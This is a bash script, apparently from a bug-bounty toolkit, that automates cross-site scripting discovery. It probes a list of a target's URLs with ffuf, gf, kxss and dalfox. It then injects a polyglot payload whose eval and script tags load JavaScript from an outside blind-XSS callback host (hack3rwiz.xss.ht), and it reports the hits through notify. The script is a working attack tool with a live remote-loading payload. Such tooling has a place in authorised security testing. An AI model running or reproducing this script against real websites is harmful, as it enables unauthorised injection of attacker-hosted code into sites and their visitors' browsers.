#!/bin/bash
RED='\e[38;5;196m'
GREEN='\e[38;5;149m'
mkdir xss > /dev/null 2>&1

cat ${1}.urls | gf xss > gf_xss
        ffuf -s -X GET -of csv -u FUZZ -w gf_xss -mc 200,403,401,301,302,303,304 -fs 0 -t 250 -o ${1}.aliveURLs  #fuzz urls gathered
                cat ${1}.aliveURLs | sed 's/,,.*//g' | sed 's/,[[:digit:]].*//g' | sed 's/,/\n/g' > temp ; cat temp | grep http | sort -u > ${1}.aliveURLs ; rm temp
rm gf_xss
cd xss
cat ../${1}.aliveURLs| grep -v FUZZ | sed 's/,,.*//g' | sed 's/,/\n/g' | grep ${1} | sed 's/^.*http/http/g' | grep "=" | egrep -iv ".(js|jpg|woff|pdf|png|jpeg|gif|css|tif|tiff|ttf|woff2|ico|svg|txt)" | qsreplace -a | qsreplace | kxss |anew kxsss | notify
cat ../${1}.urls | grep "=" | kxss | anew kxsss | notify
cat kxsss| awk -F "on " '{print $2}' | sort -u | qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=eval('var a=document.createElement(\'script\');a.src=\'https://hack3rwiz.xss.ht\';document.body.appendChild(a)') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--\><script src=https://hack3rwiz.xss.ht></script>//>\x3e"> testpolyxss
for i in $(cat testpolyxss); do echo "[+] Running on $i\n" ; curl --silent --path-as-is --insecure $i | grep "hack3rwiz.xss.ht">/dev/null 2>&1 ; if [ $? -eq 0 ]; then echo -e "$RED $i is Vulnerable\n" | notify ; else echo -e "$GREEN Not Vulnerable\n"; fi ; done
rm testpolyxss
cat kxsss| awk -F "on " '{print $2}' | sort -u | qsreplace | dalfox pipe  -b hack3rwiz.xss.ht -o dalfox_POCs
cd ..
